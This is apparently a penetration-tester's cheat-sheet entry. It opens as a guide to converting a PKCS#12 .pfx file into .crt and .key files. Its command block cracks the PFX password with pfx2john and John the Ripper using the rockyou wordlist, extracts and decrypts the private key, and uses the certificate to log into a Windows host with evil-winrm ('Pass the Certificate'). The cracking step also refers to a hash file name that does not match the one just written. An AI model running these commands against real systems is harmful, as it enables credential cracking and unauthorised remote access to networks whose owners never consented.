The `.pfx` file, which is in a PKCS#12 format, contains the *SSL certificate (public keys)* and the corresponding *private keys*. Sometimes, you might have to import the certificate and private keys separately in an unencrypted plain text format to use it on another system. This topic provides instructions on how to *convert the .pfx file to .crt and .key files*.

```sh
# Crack pfx file hash
pfx2john file.pfx > pfx_hash
john file.hash --wordlist=/usr/share/wordlists/rockyou.txt --force

# Extracting the encrypted key file
openssl pkcs12 -in file.pfx -nocerts -out private-enc.key

# Extracting the certificate
openssl pkcs12 -in file.pfx -clcerts -nokeys -out public.crt

# Decrypting the key file
openssl rsa -in private-enc.key -out private.key

# Perform Pass the Certificate
evil-winrm -i <IP> -k private.key -c public.crt -S -r [domain_name]

## -r not necessary; -S for SSL encryption
```